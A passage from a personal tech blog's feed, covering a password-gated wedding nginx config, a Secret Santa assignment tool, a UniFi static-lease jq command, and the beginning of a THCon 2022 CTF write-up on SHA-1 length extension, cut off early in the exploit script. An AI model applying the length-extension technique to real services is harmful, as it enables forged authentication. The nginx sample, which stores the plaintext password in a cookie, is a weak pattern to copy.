&amp;lt;pre style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot;&amp;gt;&amp;lt;code&amp;gt;&amp;lt;span&amp;gt;location = &amp;#x2F;robots.txt {
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    add_header Content-Type text&amp;#x2F;plain;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    return 200 &amp;amp;quot;User-agent: *\nDisallow: &amp;#x2F;\n&amp;amp;quot;;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;}
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;location ^~ &amp;#x2F;save-the-date {
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    # Disable client-side caching 
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    expires -1;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    # Set password here
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    set $password &amp;amp;quot;aabbccddeeffgg&amp;amp;quot;;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    # Start with empty auth state variable
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    set $auth_state &amp;amp;quot;&amp;amp;quot;;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    # Auth state will be set to &amp;amp;quot;q&amp;amp;quot; if query string is correct, empty string otherwise
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    if ($arg_pwd = $password) {
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        set $auth_state &amp;amp;quot;q&amp;amp;quot;;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    }
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    # Auth state will be set to &amp;amp;quot;qc&amp;amp;quot; if cookie and query string correctly configured, &amp;amp;quot;c&amp;amp;quot; if only cookie, &amp;amp;quot;q&amp;amp;quot; if only query string and empty string if no correct authentication
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    if ($cookie_pwd = $password) {
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        set $auth_state &amp;amp;quot;${auth_state}c&amp;amp;quot;;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    }
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    # If there has been no correct authentication provided - return 403 Forbidden
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    if ($auth_state = &amp;amp;quot;&amp;amp;quot;) {
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        return 403;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    }
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    # If the query string was valid (with or without a cookie), set cookie and redirect to the URL without query string
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    if ($auth_state ~ &amp;amp;quot;qc?&amp;amp;quot;) {
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        add_header Set-Cookie &amp;amp;quot;pwd=${password};Domain=${host};Path=&amp;#x2F;save-the-date&amp;amp;quot;;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        return 301 &amp;#x2F;save-the-date;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    }
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    root &amp;#x2F;var&amp;#x2F;www&amp;#x2F;ourwedding.com&amp;#x2F;public;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    try_files $uri &amp;#x2F;save-the-date&amp;#x2F;index.html;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;}
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;Let&amp;#x27;s break down how this configuration works:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;ol&amp;gt;
&amp;lt;li&amp;gt;
&amp;lt;p&amp;gt;&amp;lt;strong&amp;gt;Crawler Protection&amp;lt;&amp;#x2F;strong&amp;gt;: A standalone &amp;lt;code&amp;gt;&amp;#x2F;robots.txt&amp;lt;&amp;#x2F;code&amp;gt; directive ensures search engines won&amp;#x27;t index the site, regardless of authentication status.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;li&amp;gt;
&amp;lt;p&amp;gt;&amp;lt;strong&amp;gt;Authentication Logic&amp;lt;&amp;#x2F;strong&amp;gt;: The main directive uses Nginx variables to track authentication state:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;ul&amp;gt;
&amp;lt;li&amp;gt;&amp;lt;code&amp;gt;$auth_state&amp;lt;&amp;#x2F;code&amp;gt; can be empty, &amp;quot;q&amp;quot; (valid query string), &amp;quot;c&amp;quot; (valid cookie), or &amp;quot;qc&amp;quot; (both valid)&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;li&amp;gt;If no valid authentication exists (&amp;lt;code&amp;gt;$auth_state = &amp;quot;&amp;quot;&amp;lt;&amp;#x2F;code&amp;gt;), returns 403 Forbidden&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;li&amp;gt;When a valid query string is present, sets the cookie and redirects to remove the parameter&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;&amp;#x2F;ul&amp;gt;
&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;li&amp;gt;
&amp;lt;p&amp;gt;&amp;lt;strong&amp;gt;File Serving&amp;lt;&amp;#x2F;strong&amp;gt;: Once authenticated, Nginx serves files from the specified directory, defaulting to &amp;lt;code&amp;gt;index.html&amp;lt;&amp;#x2F;code&amp;gt;.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;&amp;#x2F;ol&amp;gt;
&amp;lt;h2 id=&amp;quot;future-plans&amp;quot;&amp;gt;Future Plans&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;This configuration is part of a larger wedding RSVP system I&amp;#x27;m developing. Once I&amp;#x27;ve polished the complete solution, I&amp;#x27;ll be open-sourcing it for other couples who want to add a technical touch to their wedding planning.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;Want to implement this for your own event? Just update the password, paths, and domain names in the configuration to match your needs. Just remember to choose a URL-friendly password - I recommend using a hex-encoded &amp;#x2F; Base64 string for compatibility.&amp;lt;&amp;#x2F;p&amp;gt;
</content>
            </entry>
            
        
            
            <entry>
                <title>Automating Secret Santa</title>
                <link href="https:&#x2F;&#x2F;guylewin.com&#x2F;blog&#x2F;2025-10-18-automating-secret-santa&#x2F;"/>
                <updated>2025-10-18T00:00:00+0000</updated>
                <id>https:&#x2F;&#x2F;guylewin.com&#x2F;blog&#x2F;2025-10-18-automating-secret-santa&#x2F;</id>
                <content type="html">&amp;lt;p&amp;gt;Every December, our family organizes a Secret Santa gift exchange. But this year presented a new problem - our usual organizer wanted to participate instead of managing the assignments.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;Suddenly, we needed a fair way to assign Secret Santas that could handle exclusions (no one should get their spouse or immediate family), avoid repeat pairings from previous years, and work without someone manually coordinating everything.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;the-over-engineered-solution&amp;quot;&amp;gt;The Over-Engineered Solution&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;Instead of finding a simple solution, I (but mostly Cursor) decided to treat this as an optimization problem. Enter the &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;en.wikipedia.org&amp;#x2F;wiki&amp;#x2F;Hungarian_algorithm&amp;quot;&amp;gt;Hungarian algorithm&amp;lt;&amp;#x2F;a&amp;gt; - a mathematical method for solving assignment problems that finds the globally optimal solution.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;The system works by:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;ol&amp;gt;
&amp;lt;li&amp;gt;&amp;lt;strong&amp;gt;Handling constraints&amp;lt;&amp;#x2F;strong&amp;gt; like exclusions&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;li&amp;gt;&amp;lt;strong&amp;gt;Building a cost matrix&amp;lt;&amp;#x2F;strong&amp;gt; where each potential giver-receiver pair gets a &amp;quot;penalty score&amp;quot; based on historical assignments (with recent assignment more penalized) supporting individuals within groups&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;li&amp;gt;&amp;lt;strong&amp;gt;Applying the Hungarian algorithm&amp;lt;&amp;#x2F;strong&amp;gt; to find the assignment that minimizes total cost&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;li&amp;gt;&amp;lt;strong&amp;gt;Outputting ideal solution&amp;lt;&amp;#x2F;strong&amp;gt; to either console (default) or by email so even the script runner doesn&amp;#x27;t see the assignments&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;&amp;#x2F;ol&amp;gt;
&amp;lt;p&amp;gt;You can find the complete code on GitHub: &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;GuyLewin&amp;#x2F;secret-santa&amp;quot;&amp;gt;https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;GuyLewin&amp;#x2F;secret-santa&amp;lt;&amp;#x2F;a&amp;gt;&amp;lt;&amp;#x2F;p&amp;gt;
</content>
            </entry>
            
        
            
            <entry>
                <title>UniFi Static IP Leases</title>
                <link href="https:&#x2F;&#x2F;guylewin.com&#x2F;blog&#x2F;2021-07-11-unifi-static-ip-leases&#x2F;"/>
                <updated>2021-07-11T00:00:00+0000</updated>
                <id>https:&#x2F;&#x2F;guylewin.com&#x2F;blog&#x2F;2021-07-11-unifi-static-ip-leases&#x2F;</id>
                <content type="html">&amp;lt;p&amp;gt;In order to organize my UniFi-controlled network, I tried to look at all the static IP allocations I made using the UniFi portal.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;Some lookups online suggested I use the &amp;quot;Insights&amp;quot; page on the UniFi portal, but I get a &amp;quot;No WiFi Networks found&amp;quot; error when I do:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;&amp;lt;img src=&amp;quot;&amp;#x2F;images&amp;#x2F;posts&amp;#x2F;unifi-static-ip-leases&amp;#x2F;1.png&amp;quot; alt=&amp;quot;&amp;quot; &amp;#x2F;&amp;gt;&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;I figured there’s a way to get the info through SSHing into the machine itself. Running &amp;lt;code&amp;gt;grep&amp;lt;&amp;#x2F;code&amp;gt; recursively throughout the filesystem made me find &amp;lt;code&amp;gt;&amp;#x2F;config&amp;#x2F;ubios-udapi-server&amp;#x2F;ubios-udapi-server.state&amp;lt;&amp;#x2F;code&amp;gt; which is a large JSON file containing device configuration. The DHCP static leases were listed under &amp;lt;code&amp;gt;services&amp;lt;&amp;#x2F;code&amp;gt; -&amp;amp;gt; &amp;lt;code&amp;gt;dhcpServers&amp;lt;&amp;#x2F;code&amp;gt; -&amp;amp;gt; &amp;lt;code&amp;gt;staticLeases&amp;lt;&amp;#x2F;code&amp;gt;. I wrote this small one-liner to retrieve the mapping as JSON array:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;cat &amp;#x2F;config&amp;#x2F;ubios-udapi-server&amp;#x2F;ubios-udapi-server.state &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;| &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;jq &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;[.services.dhcpServers[0].staticLeases[] | {ip: .addresses[0], mac: .id}] | sort_by(.ip | split(&amp;amp;quot;.&amp;amp;quot;) | map(tonumber))&amp;amp;#39;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;The output of this script is a JSON array of objects containing &amp;lt;code&amp;gt;ip&amp;lt;&amp;#x2F;code&amp;gt; and &amp;lt;code&amp;gt;mac&amp;lt;&amp;#x2F;code&amp;gt;, for example:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;json&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-json &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-json&amp;quot; data-lang=&amp;quot;json&amp;quot;&amp;gt;&amp;lt;span&amp;gt;[
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;  {
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;ip&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;: &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;192.168.1.2&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;,
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;mac&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;: &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;00:11:22:33:44:55&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;  },
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;  {
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;ip&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;: &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;192.168.1.3&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;,
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;mac&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;: &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;aa:bb:cc:dd:ee:ff&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;  }
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;]
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;Eventually I learned that the old UniFi network UI has a working Insights page containing all the static leases. In order to view this page, I had to go to the &amp;quot;System Settings&amp;quot; tab within the Network settings page and disable &amp;quot;New User Interface&amp;quot;:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;&amp;lt;img src=&amp;quot;&amp;#x2F;images&amp;#x2F;posts&amp;#x2F;unifi-static-ip-leases&amp;#x2F;2.png&amp;quot; alt=&amp;quot;&amp;quot; &amp;#x2F;&amp;gt;&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;Once I did that, I could visit the old Insights page and select the following filters to view all assigned static IP leases:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;&amp;lt;img src=&amp;quot;&amp;#x2F;images&amp;#x2F;posts&amp;#x2F;unifi-static-ip-leases&amp;#x2F;3.png&amp;quot; alt=&amp;quot;&amp;quot; &amp;#x2F;&amp;gt;&amp;lt;&amp;#x2F;p&amp;gt;
</content>
            </entry>
            
        
            
            <entry>
                <title>THCon 2k22 CTF - &quot;Local Card Maker&quot; Writeup</title>
                <link href="https:&#x2F;&#x2F;guylewin.com&#x2F;blog&#x2F;2022-04-17-thcon-2k22-ctf-local-card-maker-writeup&#x2F;"/>
                <updated>2022-04-17T00:00:00+0000</updated>
                <id>https:&#x2F;&#x2F;guylewin.com&#x2F;blog&#x2F;2022-04-17-thcon-2k22-ctf-local-card-maker-writeup&#x2F;</id>
                <content type="html">&amp;lt;p&amp;gt;I participated in &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;ctf.thcon.party&amp;#x2F;&amp;quot;&amp;gt;THCon 2k22 CTF&amp;lt;&amp;#x2F;a&amp;gt; and amongst the incredible &amp;quot;web&amp;quot; challenges - my favorite was &amp;quot;Local Card Maker&amp;quot; (made by &amp;lt;code&amp;gt;jrjgjk&amp;lt;&amp;#x2F;code&amp;gt;). In this post I&amp;#x27;ll describe the challenge and my step-by-step solution.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;the-challenge&amp;quot;&amp;gt;The Challenge&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;&amp;lt;img src=&amp;quot;&amp;#x2F;images&amp;#x2F;posts&amp;#x2F;thcon-2k22-ctf-local-card-maker-writeup&amp;#x2F;1.png&amp;quot; alt=&amp;quot;Description in the CTF portal&amp;quot; &amp;#x2F;&amp;gt;&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;Right off the bat we can tell there’s going to be some SHA-1 (&amp;lt;em&amp;gt;&amp;quot;secure hash algorithm 1&amp;quot;&amp;lt;&amp;#x2F;em&amp;gt;) with a 23 character &amp;quot;secret key&amp;quot;. The attached ZIP file contained only the following &amp;lt;code&amp;gt;scan.txt&amp;lt;&amp;#x2F;code&amp;gt; file:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot;&amp;gt;&amp;lt;code&amp;gt;&amp;lt;span&amp;gt;PAGE	|	HTTP_STATUS
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;&amp;#x2F;index.php   ==&amp;amp;gt; 200
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;&amp;#x2F;phpinfo.php ==&amp;amp;gt; 200
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;&amp;#x2F;change_profile.php ==&amp;amp;gt; 200
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;&amp;#x2F;view_profile.php ==&amp;amp;gt; 200
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;The goal is to read the content of &amp;lt;code&amp;gt;&amp;#x2F;flag.txt&amp;lt;&amp;#x2F;code&amp;gt;.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;exploring-the-site&amp;quot;&amp;gt;Exploring the Site&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;The site has 2 interesting pages I could find:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;&amp;lt;img src=&amp;quot;&amp;#x2F;images&amp;#x2F;posts&amp;#x2F;thcon-2k22-ctf-local-card-maker-writeup&amp;#x2F;2.png&amp;quot; alt=&amp;quot;View&amp;quot; &amp;#x2F;&amp;gt;
&amp;lt;img src=&amp;quot;&amp;#x2F;images&amp;#x2F;posts&amp;#x2F;thcon-2k22-ctf-local-card-maker-writeup&amp;#x2F;3.png&amp;quot; alt=&amp;quot;Edit&amp;quot; &amp;#x2F;&amp;gt;&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;The edit page sets a cookie (&amp;lt;code&amp;gt;user_data&amp;lt;&amp;#x2F;code&amp;gt;) with the PHP-serialized &amp;lt;code&amp;gt;User&amp;lt;&amp;#x2F;code&amp;gt; object set in the form (along with another cookie - &amp;lt;code&amp;gt;user_hash&amp;lt;&amp;#x2F;code&amp;gt; to sign that data), and the view page displays that information if the hash is valid. I tried modifying &amp;lt;code&amp;gt;user_data&amp;lt;&amp;#x2F;code&amp;gt; in multiple ways but kept getting hash validation errors. I decided to put that aside and try a different direction.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;The URLs of these pages - &amp;lt;code&amp;gt;http:&amp;#x2F;&amp;#x2F;challenges1.thcon.party:2001&amp;#x2F;index.php?page=Y2hhbmdlX3Byb2ZpbGU=&amp;amp;amp;pHash=0171caa8e7a1fe56361fdce865e6e174b3b892f9&amp;lt;&amp;#x2F;code&amp;gt; and &amp;lt;code&amp;gt;http:&amp;#x2F;&amp;#x2F;challenges1.thcon.party:2001&amp;#x2F;index.php?page=dmlld19wcm9maWxl&amp;amp;amp;pHash=7b6f8b016f25da478b9f28f878aa3be8cced66fd&amp;lt;&amp;#x2F;code&amp;gt; - both seem to go through &amp;lt;code&amp;gt;index.php&amp;lt;&amp;#x2F;code&amp;gt; for rendering. The &amp;lt;code&amp;gt;page&amp;lt;&amp;#x2F;code&amp;gt; parameter is base64-encoded &amp;quot;change_profile&amp;quot; and &amp;quot;view_profile&amp;quot; which matches the files in &amp;lt;code&amp;gt;scan.txt&amp;lt;&amp;#x2F;code&amp;gt;!&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;When I tried to access &amp;lt;code&amp;gt;&amp;#x2F;phpinfo.php&amp;lt;&amp;#x2F;code&amp;gt;, &amp;lt;code&amp;gt;&amp;#x2F;change_profile.php&amp;lt;&amp;#x2F;code&amp;gt; or &amp;lt;code&amp;gt;&amp;#x2F;view_profile.php&amp;lt;&amp;#x2F;code&amp;gt; directly I received an error (&amp;quot;Direct access to this page is disable.&amp;quot;).&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;Theoretically - we can access &amp;lt;code&amp;gt;phpinfo.php&amp;lt;&amp;#x2F;code&amp;gt; if we could put that value (Base64-encoded) in the &amp;lt;code&amp;gt;page&amp;lt;&amp;#x2F;code&amp;gt; query parameter - but without finding the proper hash the validation will keep failing.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;sha-1-exploitation&amp;quot;&amp;gt;SHA-1 Exploitation&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;A quick Google search led me to &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;journal.batard.info&amp;#x2F;post&amp;#x2F;2011&amp;#x2F;03&amp;#x2F;04&amp;#x2F;exploiting-sha-1-signed-messages&amp;quot;&amp;gt;this article&amp;lt;&amp;#x2F;a&amp;gt; which seemed like the perfect solution - if I have data and SHA-1 hash on it with a salt prefix (of known length) - I can append data to it and calculate a valid hash, without knowing the salt! To understand this section better - I recommend reading the article before proceeding.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;I relied heavily on &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;nicolasff&amp;#x2F;pysha1&amp;quot;&amp;gt;the code from the article &amp;lt;code&amp;gt;nicolasff&amp;lt;&amp;#x2F;code&amp;gt; posted on GitHub&amp;lt;&amp;#x2F;a&amp;gt; to create a script to fetch &amp;lt;code&amp;gt;phpinfo.php&amp;lt;&amp;#x2F;code&amp;gt;:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;python&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-python &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-python&amp;quot; data-lang=&amp;quot;python&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;import &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;struct
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;import &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;base64
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;import &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;urllib.parse
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;import &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;requests
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# The code below is based on https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;nicolasff&amp;#x2F;pysha1 (adapted to Python3) until line 87:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;top &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;0xffffffff
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;def &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#8ec07c;&amp;quot;&amp;gt;rotl&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;i&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;n&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;):
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    lmask &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;top &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;lt;&amp;amp;lt; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;32&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;-&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;n)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    rmask &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;top &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;gt;&amp;amp;gt; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;n
